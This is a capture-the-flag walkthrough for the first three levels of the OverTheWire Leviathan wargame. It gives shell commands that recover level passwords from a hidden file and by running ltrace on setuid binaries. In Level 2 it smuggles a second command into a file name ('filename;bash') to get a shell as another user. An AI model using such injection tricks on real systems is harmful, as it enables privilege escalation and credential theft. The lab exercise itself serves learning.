# Leviathan

## Level 0

* Goal - To login to the first level use Username - leviathan0, Password - leviathan0. Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.

* Commands - ssh

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan0

ls

ls -a
#shows hidden .backup directory

cd .backup/

ls

cat bookmarks.html

cat bookmarks.html | grep password
#password (rioGegei8m)

exit
```

## Level 1

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan1

ls -a
#shows file called check

file check
#binary

./check
#asks password, tried previous password but doesn't work

strings check
#strings prints readable strings
#shows particular strings

ltrace ./check
#run a command until exits
#to understand logic used
#binary compares string with "sex"
#entering "sex" as password for binary

./check
#opens /bin/sh

whoami
#leviathan2

cat /etc/leviathan_pass/leviathan2
#password (ougahZi8Ta)

exit

exit
```

## Level 2

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan2

ls -a
#shows that printfile is owned by leviathan3

file printfile
#shows binary file

./printfile
#shows command to print a file

ldd printfile
#prints shared libraries

man readelf
#tool to display info for ELF files

readelf -h printfile

ltrace ./printfile /etc/leviathan_pass/leviathan3
#shows access function in code, exits

ltrace ./printfile /etc/passwd
#this works and we get access
#it tries to run /bin/cat for filename

mktemp -d
#create random directory in /tmp

cd /tmp/tmp.xRVgCgdIfr

touch 'filename;bash'
#creating file with a name containing semicolon, following which we place command to be executed

ls

~/printfile 'filename;bash'
#run printfile (in home directory) to print 'filename;bash'
#this executes bash command
#now we enter bash with leviathan3

whoami
#leviathan3

cat /etc/leviathan_pass/leviathan3
#password (Ahdiemoo1j)

exit

exit
```
